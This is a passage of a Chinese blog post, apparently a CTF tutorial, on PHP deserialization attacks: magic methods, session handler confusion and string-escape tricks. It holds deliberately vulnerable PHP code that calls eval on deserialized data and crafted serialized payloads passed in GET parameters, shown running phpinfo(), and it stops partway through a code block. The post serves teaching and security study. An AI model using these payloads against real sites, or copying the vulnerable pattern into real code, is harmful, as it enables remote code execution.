<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>PHP反序列化姿势集总</title>
<meta name="keywords" content="PHP反序列化姿势集总, R0seW1thH3r">
<meta name="description" content="php魔法方法：
__wakeup() //执行unserialize()时，先会调用这个函数	★
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发	  ★
__call">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="stylesheet" href="/style/main.css">


<link rel="stylesheet" href="/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/style/prism.css"/>




  <meta name="generator" content="Hexo 6.1.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://R0seW1thH3r.github.io/archives">
        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://R0seW1thH3r.github.io/archives">
        <h1 class="site-title">R0seW1thH3r</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/archives" class="menu purple-link">
        首页
      </a>
    
  
    
      <a href="/tags" class="menu purple-link">
        标签
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        关于
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">PHP反序列化姿势集总</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-01-09</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/web%E5%AE%89%E5%85%A8/">
              web安全
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <p>php<strong>魔法方法</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//执行unserialize()时，先会调用这个函数	★</span>
<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//执行serialize()时，先会调用这个函数</span>
<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//对象被销毁时触发	  ★</span>
<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发	★</span>
<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span>
<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法	  ★</span>
<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于将数据写入不可访问的属性 	★</span>
<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span>
<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span>
<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发		★</span>
<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//当尝试将对象调用为函数时触发	   ★</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640">带你走进PHP session反序列化漏洞 - 先知社区 (aliyun.com)</a></p>
<p><strong>PHP session</strong> 的存储机制是由<code>session.serialize_handler</code>来定义<u>引擎</u>的，默认是以<strong>文件</strong>的方式存储。</p>
<p>文件的内容始终是<strong>session值的序列化</strong>之后的内容。</p>
<p><code>session.serialize_handler</code>定义的<u>引擎</u>有三种，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名  +  |  +  session经过序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名长度对应的 ASCII 字符  +  键名  +  session经过序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>session经过序列化处理的数组</td>
</tr>
</tbody></table>
<p>CTF中的session反序列化与<code>php</code>和<code>php_serialize</code>这2个引擎有关。</p>
<p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器<strong>混合</strong>起来用，就会造成危害。</p>
<blockquote>
<p>当我们用<code>php_serialize</code>引擎写入session后，再用<code>php</code>引擎去读取session，就会造成危害。</p>
</blockquote>
<p>举个例子：</p>
<p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//session.serialize_handler默认是php引擎</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指定php_serialize引擎</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>sess传参hello，此时session文件内容为：</p>
<pre class="line-numbers language-none"><code class="language-none">a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>看似一点伤害都没有，但是如果此时存在一个这样的文件：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这句不写都行，只要确定是默认php引擎</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们构造出恶意的序列化内容：</p>
<pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果在sess传参：<code>?sess=|O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<p>此时session文件变成：</p>
<pre class="line-numbers language-none"><code class="language-none">a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当我们用这个session去访问第二个页面时，通过<code>php</code>引擎读取到的<code>$_SESSION</code>的值就变成了：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token string single-quoted-string">'a:1:&#123;s:7:"session";s:44:"'</span> <span class="token operator">=></span> 
    <span class="token keyword type-declaration">object</span><span class="token punctuation">(</span>__PHP_Incomplete_Class<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
      <span class="token keyword">public</span> <span class="token string single-quoted-string">'__PHP_Incomplete_Class_Name'</span> <span class="token operator">=></span> <span class="token keyword type-declaration">string</span> <span class="token string single-quoted-string">'Test'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
      <span class="token keyword">public</span> <span class="token string single-quoted-string">'cmd'</span> <span class="token operator">=></span> <span class="token keyword type-declaration">string</span> <span class="token string single-quoted-string">'phpinfo();'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>显然，键名不再是<code>session</code>，而变成了<code>a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;</code>，这是因为<code>php</code>引擎将<code>|</code>当做了分隔符，将<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</code>当做了值。进行反序列化时，后面的<code>&quot;;&#125;</code> 将不会被考虑在内。</p>
<p>所以session经过序列化处理的值变成了<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<p>也就是我们构造的恶意序列化内容。访问第二个页面时，就会执行<code>phpinfo()</code> 。</p>
<blockquote>
<p>总结一下吧：</p>
<p>在<code>php_serialize</code>引擎下控制传参更改session内容，用<code>|</code>起头，后面接poc；</p>
<p>然后访问 使用<code>php</code>引擎 的页面。</p>
</blockquote>
<h1 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解 - FreeBuf网络安全行业门户</a></p>
<h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><p>对我们输入的序列化后里的 关键字符串 <strong>替换成长度更长</strong>的字符串。</p>
<p>例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/admin/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hacked'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$k</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">k</span><span class="token operator">=</span><span class="token variable">$k</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可控参数</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果直接传参<code>?k=admin</code> ，得到的序列化字符串为：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//过滤前</span>
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hacked"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//过滤后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们要让<code>$cmd=phpinfo();</code> 则应该是这样的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果我们直接传参<code>?k=admin&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">36</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>cmd<span class="token string double-quoted-string">";s:13:"</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'nono~'</span><span class="token punctuation">;</span><span class="token string double-quoted-string">";&#125;//过滤前
O:4:"</span>Test<span class="token string double-quoted-string">":2:&#123;s:1:"</span>k<span class="token string double-quoted-string">";s:36:"</span>hacked<span class="token string double-quoted-string">";s:3:"</span>cmd<span class="token string double-quoted-string">";s:10:"</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//过滤后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>过滤前，k的值为<code>admin&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code> ，长度是36.</p>
<p>过滤后，k的值长度还是36，但是hacked比admin多一个字符，这就导致<code>hacked&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>的最后一个<code>&#125;</code> 逃逸出去了。</p>
<p>想让过滤后的序列化字符串变得正常，我们就需要逃逸出<code>&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code> 这些字符，也就是31个字符长度。</p>
<p>admin–&gt;hacked每次加1个字符，所以我们需要 31个admin ，然后后面接上我们构造的<code>&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code> 。</p>
<pre class="line-numbers language-none"><code class="language-none">?k&#x3D;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时phpinfo执行成功了。</p>
<p>我们可以观察一下此时过滤后的序列化字符串：</p>
<pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;k&quot;;s:186:&quot;hackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhackedhacked&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:13:&quot;echo &#39;nono~&#39;;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>hacked的长度刚好是186。</p>
<h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><p>对我们输入的序列化后里的 关键字符串 <strong>替换成长度更短</strong>的字符串。</p>
<p>例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/admin/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hack'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$k</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">k</span><span class="token operator">=</span><span class="token variable">$k</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可控参数</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种情况需要有2个可控的变量。</p>
<p>如果直接传参<code>?k=admin&amp;p=a</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤前</span>
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token comment">//过滤后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>k的值变短了，后面的字符串会一个个缩进来。如果我们让<code>&quot;;s:1:&quot;p&quot;;s:1:&quot;</code>缩进去，那么后面的都取决于p的值，这是可控的。</p>
<pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Test&quot;:3:&#123;s:1:&quot;k&quot;;s:5:&quot; admin&quot;;s:1:&quot;p&quot;;s:1:&quot; a&quot;;s:3:&quot;cmd&quot;;s:13:&quot;echo &#39;nono~&#39;;&quot;;&#125;
                           ↑____________________↑
箭头所指的范围变成k的值，后面的a是可控的！
需要缩进去的字符串为： &quot;;s:1:&quot;p&quot;;s:1:   长度是14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此我们先构造14个admin。</p>
<p>接下来构造p的值。</p>
<p>理想序列化字符串为：</p>
<pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Test&quot;:3:&#123;s:1:&quot;k&quot;;s:5:&quot;admin&quot;;s:1:&quot;p&quot;;s:1:&quot;a&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以如果我们传参<code>p=;s:1:&quot;p&quot;;s:1:&quot;a&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"adminadminadminadminadminadminadminadminadminadminadminadminadminadmin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string 